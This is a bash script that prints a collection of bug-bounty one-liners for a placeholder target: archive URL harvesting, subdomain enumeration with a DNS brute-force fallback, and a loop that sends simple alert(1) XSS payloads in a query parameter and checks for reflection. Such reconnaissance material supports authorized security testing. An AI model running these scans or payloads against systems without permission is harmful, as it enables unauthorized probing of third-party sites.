#!/bin/bash
# XSS Vibes - Robust OneLiners with Fallbacks
# Generated with service availability check

echo "🔥 XSS Vibes - Bug Bounty OneLiners Collection"
echo "=============================================="
echo ""
echo "📋 Available OneLiners (replace {target} with actual domain):"
echo ""

echo "🔄 Wayback With Fallbacks:"
echo "waybackurls {target} 2>/dev/null || curl -s \"https://arquivo.pt/wayback/cdx?url={target}/*\" 2>/dev/null || echo \"Using local URL list...\" && cat saved_urls.txt 2>/dev/null || echo \"All wayback services failed - using manual discovery\""
echo "📁 Save to file: waybackurls {target} > wayback_urls.txt"
echo ""

echo "🕵️ Subdomain Enum Robust:"
echo "subfinder -d {target} -silent 2>/dev/null || amass enum -passive -d {target} 2>/dev/null || (echo \"API services down - using DNS bruteforce:\" && for sub in www api admin test dev staging; do dig +short \$sub.{target} | head -1; done)"
echo "📁 Save to file: subfinder -d {target} -silent > subdomains.txt"
echo ""

echo "🔗 GAU With Fallbacks:"
echo "gau {target} 2>/dev/null || waybackurls {target} 2>/dev/null || echo \"Using manual URL discovery...\""
echo "📁 Save to file: gau {target} > gau_urls.txt"
echo ""

echo "🔄 Combine All URLs (with deduplication):"
echo "cat gau_urls.txt wayback_urls.txt | sort -u > all_unique_urls.txt"
echo ""

echo "🚨 XSS Test Offline:"
echo "echo {target} | httpx -silent | while read url; do for payload in \"<script>alert(1)</script>\" \"javascript:alert(1)\" \"'><svg onload=alert(1)>\"; do curl -s \"\$url?test=\$payload\" | grep -q \"alert(1)\" && echo \"XSS found: \$url\"; done; done"
echo "📁 Save to file: echo {target} | httpx -silent | while read url; do for payload in ...; done > xss_results.txt"
echo ""

echo "💻 Local JS Analysis:"
echo "find . -name \"*.js\" -exec grep -l \"innerHTML\\|outerHTML\\|eval\" {} \\; | while read file; do echo \"Analyzing: \$file\"; grep -n \"innerHTML\\|outerHTML\\|eval\" \"\$file\"; done"
echo "📁 Save to file: find . -name \"*.js\" -exec grep -l \"innerHTML\\|outerHTML\\|eval\" {} \\; > vulnerable_js.txt"
echo ""

echo "🎯 Usage Examples:"
echo "Replace {target} with your domain, example:"
echo "waybackurls example.com > wayback_urls.txt"
echo "gau example.com > gau_urls.txt" 
echo "subfinder -d example.com -silent > subdomains.txt"
echo "cat gau_urls.txt wayback_urls.txt | sort -u > all_urls.txt"
echo ""
echo "📊 File Management:"
echo "wc -l *.txt          # Count lines in all text files"
echo "head -10 urls.txt    # Show first 10 lines"
echo "tail -10 urls.txt    # Show last 10 lines"
echo "grep 'admin' *.txt   # Search for 'admin' in all files"
echo ""
echo "🔥 More commands available in original onlinery file!"


